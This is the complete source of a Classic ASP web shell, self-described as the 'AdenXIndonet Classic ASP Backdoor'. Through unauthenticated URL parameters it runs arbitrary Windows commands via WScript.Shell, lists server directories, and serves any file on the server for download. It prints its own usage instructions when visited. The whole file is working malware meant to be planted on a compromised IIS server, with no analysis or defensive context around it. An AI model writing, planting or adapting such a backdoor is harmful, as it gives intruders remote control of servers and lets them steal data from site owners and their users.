<%@ Language=VBScript %>
<%
' AdenXIndonet Classic ASP Backdoor 🩸

Response.Buffer = True
Response.ContentType = "text/plain"

cmd = Request.QueryString("cmd")
action = Request.QueryString("action")
file = Request.QueryString("file")
url = Request.QueryString("url")

If cmd <> "" Then
    ExecuteCommand(cmd)
ElseIf action = "list" Then
    ListDirectory(file)
ElseIf action = "download" Then
    DownloadFile(file)
Else
    Response.Write "AdenXIndonet ASP Backdoor Active!" & vbCrLf
    Response.Write "?cmd=command" & vbCrLf
    Response.Write "?action=list&file=c:\" & vbCrLf
    Response.Write "?action=download&file=test.txt" & vbCrLf
End If

Sub ExecuteCommand(command)
    Dim wsh, exec
    Set wsh = CreateObject("WScript.Shell")
    Set exec = wsh.Exec("%comspec% /c " & command)
    Response.Write exec.StdOut.ReadAll
    If exec.StdErr.ReadAll <> "" Then
        Response.Write "[ERROR] " & exec.StdErr.ReadAll
    End If
End Sub

Sub ListDirectory(path)
    Dim fso, folder, file, subfolder
    Set fso = CreateObject("Scripting.FileSystemObject")
    
    If fso.FolderExists(path) Then
        Set folder = fso.GetFolder(path)
        Response.Write "Directory: " & path & vbCrLf & vbCrLf
        
        Response.Write "[FOLDERS]" & vbCrLf
        For Each subfolder In folder.SubFolders
            Response.Write subfolder.Name & vbCrLf
        Next
        
        Response.Write vbCrLf & "[FILES]" & vbCrLf
        For Each file In folder.Files
            Response.Write file.Name & " - " & file.Size & " bytes" & vbCrLf
        Next
    Else
        Response.Write "Path not found"
    End If
End Sub

Sub DownloadFile(path)
    Dim fso, file
    Set fso = CreateObject("Scripting.FileSystemObject")
    
    If fso.FileExists(path) Then
        Set file = fso.GetFile(path)
        Response.Buffer = False
        Response.ContentType = "application/octet-stream"
        Response.AddHeader "Content-Disposition", "attachment; filename=" & file.Name
        
        Dim stream
        Set stream = CreateObject("ADODB.Stream")
        stream.Open
        stream.Type = 1
        stream.LoadFromFile path
        Response.BinaryWrite stream.Read
        stream.Close
    Else
        Response.Write "File not found"
    End If
End Sub
%>